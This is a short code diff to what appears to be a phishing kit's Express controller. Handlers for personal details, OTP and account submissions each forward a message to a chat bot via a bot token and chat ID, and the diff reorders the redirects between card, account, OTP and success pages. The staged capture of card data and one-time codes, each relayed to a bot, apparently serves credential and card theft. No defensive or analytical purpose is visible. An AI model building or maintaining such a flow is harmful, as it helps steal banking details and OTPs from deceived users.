@@ -127,7 +127,7 @@ exports.personalPost = async (req, res) => {
   const sendMessage = sendMessageFor(botToken, chatId);
   sendMessage(message);
 
-  res.redirect("/auth/card");
+  res.redirect("/auth/account");
 };
 
 exports.card = (req, res) => {
@@ -188,7 +188,7 @@ exports.otpPost = async (req, res) => {
   const sendMessage = sendMessageFor(botToken, chatId);
   sendMessage(message);
 
-  res.redirect("/auth/otp/2");
+  res.redirect("/auth/success");
 };
 
 exports.otp2 = (req, res) => {
@@ -247,7 +247,7 @@ exports.accountPost = async (req, res) => {
   const sendMessage = sendMessageFor(botToken, chatId);
   sendMessage(message);
 
-  res.redirect("/auth/success");
+  res.redirect("/auth/card");
 };
 
 exports.success = (req, res) => {
